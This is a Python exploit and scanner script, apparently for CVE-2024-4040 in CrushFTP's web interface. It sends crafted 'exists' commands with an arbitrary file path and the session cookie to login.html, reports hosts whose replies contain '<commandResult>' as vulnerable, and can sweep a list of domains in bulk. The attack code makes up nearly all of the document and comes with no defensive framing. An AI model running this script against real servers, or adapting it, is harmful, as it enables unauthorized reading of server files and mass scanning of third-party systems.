from colorama import Fore
import requests
import argparse
import ssl

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"

parser = argparse.ArgumentParser()

parser.add_argument('-t', '--target',
                   help="target to scan")
parser.add_argument('-f', '--file',
                   help="file to fetch")
parser.add_argument('-d', '--domains',
                   help="file containing list of domains")

args = parser.parse_args()

header = {
    "User-Agent": user_agent
}

banner = """


 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗      ██╗  ██╗ ██████╗ ██╗  ██╗ ██████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ██║  ██║██╔═████╗██║  ██║██╔═████╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗███████║██║██╔██║███████║██║██╔██║
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝╚════██║████╔╝██║╚════██║████╔╝██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║           ██║╚██████╔╝     ██║╚██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝           ╚═╝ ╚═════╝      ╚═╝ ╚═════╝

Author: c0d3ninja


"""
 

def check_vulnerability(target: str, response_text: str, file: str):
    if "<commandResult>" in response_text:
        print(f"{Fore.GREEN}[+] {Fore.WHITE}{target} - VULNERABLE!{Fore.RESET}\n")
        #print(response_text)
    else:
        pass


def get_files(target: str, file: str) -> str:
    try:
        s = requests.Session()
        r = s.post(f"http://{target}/WebInterface/login.html")
        cookies = r.cookies

        data = {
            "command": "exists",
            "paths": fr"{file}",
        }

        if 'currentAuth' in cookies:
            data['c2f'] = cookies['currentAuth']

        r = s.post(f"http://{target}/WebInterface/login.html", data=data, cookies=cookies, headers=header)

        check_vulnerability(target, r.text, file)

    except requests.exceptions.SSLError as e:
        print(e)
    except requests.exceptions.ConnectionError:
        pass

def scan_domain(file: str, command: str):
    with open(file, "r") as f:
        domains = [x.strip() for x in f.readlines()]
    
    for domainlist in domains:
        get_files(domainlist, command)


if __name__ == "__main__":

    print(banner)

    if args.target:
        if args.file:
            get_files(args.target, args.file)
    
    if args.domains:
        if args.file:
            scan_domain(args.domains, args.file)




